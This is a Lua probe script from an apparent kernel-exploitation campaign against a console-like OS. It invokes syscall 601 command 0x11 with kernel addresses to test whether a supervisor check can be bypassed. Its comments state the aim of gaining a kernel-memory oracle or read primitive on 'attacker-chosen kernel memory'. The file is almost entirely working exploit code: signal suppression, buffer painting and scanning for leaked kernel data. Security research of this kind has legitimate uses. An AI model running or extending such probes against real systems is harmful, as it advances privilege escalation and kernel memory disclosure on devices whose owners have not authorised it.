-- CRASH_CLASS: HIGH -- 601 cmd 0x11 with a mapped user pointer in arg2 already kills the process
-- (1383b). This probe asks whether a KERNEL address in that slot does the same, which is the one
-- way to tell a supervisor-access fault from a body that simply dereferences arg2.
-- PROBE 1393a: 601 cmd 0x11 - user pointer versus kernel pointer in arg2.
--
-- 1383b (`results/phase35_dead_end_reruns/1383b_sys601_shape_matrix2_20261109_135948.txt`) measured
-- three shapes of `0x11`: arg2 null -> EFAULT(14), arg1 non-null -> EINVAL(22), **arg2 = a mapped
-- user page -> the process dies**. A copyout destination would have accepted a mapped user page, so
-- `0x11` is not doing a checked copyout into arg2: it faults on something else, or it dereferences
-- arg2 directly and the supervisor denies it.
--
-- 1391a (`results/phase35_dead_end_reruns/1391a_kernel_arg_sweep_20261109_141210.txt`) never tried
-- `0x11` with a kernel address - it only swept 0x00/0x0D/0x0E/0x13/0x14/0x19/0x1A in phase B, and
-- left 0x11 off the list precisely because it kills. That leaves a decision this probe can settle:
--
--   * if a MAPPED kernel address in arg2 also kills, 0x11 dereferences arg2 and the supervisor
--     boundary stops it - the same wall as everywhere else, and 0x11 is closed for good;
--   * if a mapped kernel address SURVIVES where the user page died, then 0x11 dereferences arg2 as
--     a kernel pointer, the supervisor check passes, and the body runs on attacker-chosen kernel
--     memory. That is a kernel-memory oracle at minimum and a read primitive if anything it touches
--     comes back through arg1.
--
-- The order is deliberate: the jackpot case first, then the stub page, then an absent page, then
-- the null-arg1 variant. Every call prints a line BEFORE it is made, so a kill identifies itself.
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1383b_sys601_shape_matrix2_20261109_135948.txt (0x11 kills on arg2)
--   results/phase35_dead_end_reruns/1391a_kernel_arg_sweep_20261109_141210.txt (K-class on other cmds)
--   results/1331a_20261109_141053.txt (this boot's present/absent kernel map)
--   docs/MDBG_601_COMMAND_MAP_14_10.md (the 14.10 command table)

print("=== PROBE 1393a: 601 0x11 USER vs KERNEL ARG2 ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function hex(v) v = v % 4294967296 return string.format("%08X", v) end
local function rd(a) local ok,v = pcall(function() return N(memory.read_dword(a)) end) if ok then return v % 4294967296 end return nil end
local function UA(v) if type(v) == "string" then return uint64(v) end return uint64(v) end

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", PID))

local sa = memory.alloc(0x80)
for i = 0, 0x60, 8 do pcall(function() memory.write_qword(sa + i, uint64(0)) end) end
pcall(function() memory.write_qword(sa, uint64(1)) end)
local ign = 0
for _, s in ipairs({5, 6, 7, 8, 12, 24, 25, 26, 30, 31}) do
    local ok, rv = pcall(function() return mk(416)(uint64(s), uint64(sa), uint64(0)) end)
    if ok and N(rv) == 0 then ign = ign + 1 end
end
print(string.format("[0] SIG_IGN installed on %d/10 signals", ign))

local BUF = memory.alloc(0x1000)
local BA = N(BUF)
local PAINT = string.rep(string.char(0xA5), 0x1000)
local function paint() pcall(function() memory.write_buffer(BUF, PAINT) end) end
local function scan()
    local n, acc = 0, {}
    for i = 0, 0xFF do
        local v = rd(BA + i * 4)
        if v and v ~= 0xA5A5A5A5 then n = n + 1; if #acc < 8 then acc[#acc + 1] = hex(v) end end
    end
    return n, table.concat(acc, " ")
end

local K1  = "0xFFFFFFFFC1000000"   -- image base, present this boot
local K3  = "0xFFFFFFFFC0000000"   -- stub page, present
local ABS = "0xFFFFFFFFD0000000"   -- absent

local function canary()
    local ok = pcall(function() memory.write_dword(BA + 0xFFC, 0xC0DE) end)
    if ok and rd(BA + 0xFFC) == 0xC0DE then return true end
    return false
end
print(string.format("[0] canary %s", canary() and "ok" or "FAILED"))

print("")
print("[A] 601(0x11, arg1=buffer, arg2=...): the slot that killed on a user page")
local function t11(arg2, arg2name, a1, a1name)
    paint()
    print(string.format("  -> 601(0x11, %s, %s)", a1name, arg2name))
    local ok, rv = pcall(function() return mk(601)(UA(0x11), UA(a1), UA(arg2), uint64(0), uint64(0), uint64(0)) end)
    if not ok then print("  <- EXC"); return false end
    local n, first = scan()
    print(string.format("  <- rv=%d %-24s changed=%d %s", N(rv), es(), n, first))
    return true
end

-- jackpot first: a mapped kernel image page where the user page died
if not t11(K1, "K1(image)", BA, "buf") then print("[A] died on K1; the probe ends here"); print("=== PROBE 1393a INCOMPLETE ==="); return end
if not t11(K3, "K3(stub)", BA, "buf") then print("[A] died on K3"); print("=== PROBE 1393a INCOMPLETE ==="); return end
if not t11(ABS, "ABS(absent)", BA, "buf") then print("[A] died on ABS - 0x11 dereferences arg2"); print("=== PROBE 1393a INCOMPLETE ==="); return end
if not t11(K1, "K1(image)", 0, "0") then print("[A] died on null-arg1+K1"); print("=== PROBE 1393a INCOMPLETE ==="); return end
if not t11(BA, "U(page)", BA, "buf") then print("[A] died on the user page, as 1383b predicted"); print("=== PROBE 1393a INCOMPLETE ==="); return end

print("")
print("[B] control: the other non-lethal commands with K1 in both pointer slots")
for _, cmd in ipairs({0x0D, 0x13, 0x14, 0x19, 0x1A}) do
    paint()
    print(string.format("  -> 601(0x%02X, K1, K1)", cmd))
    local ok, rv = pcall(function() return mk(601)(UA(cmd), UA(K1), UA(K1), uint64(0), uint64(0), uint64(0)) end)
    if not ok then print("  <- EXC"); break end
    local n, first = scan()
    print(string.format("  <- rv=%d %-24s changed=%d %s", N(rv), es(), n, first))
end

print("")
print(string.format("[C] canary at the end: %s", canary() and "ok" or "FAILED"))
print("=== PROBE 1393a COMPLETE ===")
